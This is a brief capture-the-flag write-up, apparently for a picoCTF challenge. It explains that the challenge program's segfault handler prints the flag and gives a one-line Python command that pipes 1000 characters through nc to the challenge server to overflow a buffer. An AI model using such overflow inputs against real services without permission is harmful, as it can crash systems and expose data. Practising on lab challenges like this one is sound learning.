
In the C source code, we can see segsev handler there, flushing the flag.

So what we only need to do is overflow the buffer, nothing fancy about take advantage of format string.

```bash
python -c "print('a' * 1000)" | nc mimas.picoctf.net 54430
```
